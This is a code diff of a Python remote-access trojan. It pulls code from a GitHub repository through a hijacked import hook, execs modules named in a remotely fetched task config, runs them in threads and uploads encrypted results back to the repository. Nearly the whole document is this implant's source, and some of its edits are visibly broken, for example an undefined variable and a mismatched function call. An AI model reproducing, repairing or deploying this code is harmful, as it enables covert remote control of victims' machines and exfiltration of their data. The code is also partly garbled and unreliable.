@@ -6,6 +6,7 @@ import imp
 import threading
 import Queue
 import zlib
+import zipfile
 import Config
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP
@@ -18,7 +19,7 @@ class ReImp(object):
 	def find_module(self, fullname, path=None):
 		lib = get_file(config.my_mod() + fullname)
 		if lib is not None:
-			self.code = decrypt(self.code)
+			self.code = lib
 			return self
 		return None
 
@@ -34,54 +35,59 @@ def connect():
 	return gh, repo
 
 def get_file(path):
-	gh, repo = connect()
-	contents = repo.file_contents(path).decoded()
-	return contents
+	try:
+		gh, repo = connect()
+		return decrypt(repo.file_contents(path).decoded)
+	except:
+		return None
 
 def create_config():
-	gh repo = connect()
-	repo.create_file(config.my_config(), config.com_mess(), "")
-	return
+	try:
+		gh, repo = connect()
+		repo.create_file(config.my_config(), config.com(), config.com())
+		return 1
+	except:
+		return 0
 
 def get_config():
-	config_json = get_file(config.my_config())
-	if config_json == None or len(config_json) == 0:
+	c_json = get_file(config.my_config())
+	try:
+		c_dict = json.loads(c_json)
+		for mod in c_dict:
+			if task['module'] not in sys.modules:
+				exec("import %s" % task['module'])
+		return c_dict
+	except:
 		return None
-	config_json = decrypt(config_json)
-	config_file = json.loads(config_json)
-	for task in config_file:
-		if task['module'] not in sys.modules:
-			exec("import %s" % task['module'])
-	return config_file
 
 def clear_config():
-	gh, repo = connect()
-	repo.file_contents(config.my_config()).update(config.my_com(), "")
+	try:
+		gh, repo = connect()
+		repo.file_contents(config.my_config()).update(config.com(), config.com())
+		return 1
+	except:
+		return 0
 
 def push_data(data):
-	gh, repo = connect()
-	repo.create_file(config.my_data(), config.com_mess(), encrypt(data))
-	return
+	try:
+		gh, repo = connect()
+		repo.create_file(config.my_data(), config.com(), encrypt(data))
+		return 1
+	except:
+		return 0
 
 def decrypt(data):
-	key = RSA.importKey(config.my_pk())
-	key = PKCS1_OAEP.new(key)
-	size = 256
-	offset = 0
-	decrypted = ""
-	encrypted = base64.b64decode(data)
-	while offset < len(encrypted):
-		decrypted += key.decrypt(encrypted[offset:offset+chunk])
-		offset += size
-	decompressed = zlib.decompress(decrypted)
-	return decompressed
+#	decoded = base64.b64decode(data)
+#	compressed = zipfile.ZipFile(decoded, 'r')
+#	decompressed = compressed.read(name, config.my_pwd())
+#	return decompressed
+	return data
 
 def encrypt(data):
-	key = RSA.importKey(config.my_pk())
-	key = PKCS1_OAEP.new(key)
-	size = 256
+	key = config.my_pk()
+	size = config.my_size()
 	offset = 0
-	encrypted = ""	
+	encrypted = ""
 	compressed = zlib.compress(data)
 	while offset < len(compressed):
 		chunk = compressed[offset:offset+size]
@@ -89,35 +95,34 @@ def encrypt(data):
 			chunk += " " * (size - len(chunk))
 		encrypted += key.encrypt(chunk)
 		offset += size
-	encoded = base64.b64encode(encrypted)
-	return encoded
+	return base64.b64encode(encrypted)
 
 def run_module(task):
-	result = sys.modules[task['module']].run(task['args'])
-	if result is not None:
-		push_data(result)
-	return
+		result = sys.modules[task].run()
+		if result is not None:
+			push_data(result)
+		return
 
 def module_runner():
-	while !(config.tasks.empty()):
+	while not config.tasks.empty():
 		task = config.tasks.get()
-		t = threading.Thread(target=run_module, args = (task))
+		t = threading.Thread(target=run_module, kwargs = task)
 		t.start()
 		if 'sleep' in task:
 			time.sleep(task['sleep'])
 	return
 
-config = Config()
+config = Config.Config()
 sys.meta_path = [ReImp()]
 create_config()
 while True:
 	if config.tasks.empty():
-		config_file = get_config():
+		config_file = get_config()
 		if config_file == None:
 			time.sleep(config.my_sleep())
 			continue
 		for task in config_file:
-			config.tasks.add(task)
-	if !(config.tasks.empty()):
+			config.tasks.put(task)
+	if not config.tasks.empty():
 		module_runner()
 		clear_config()
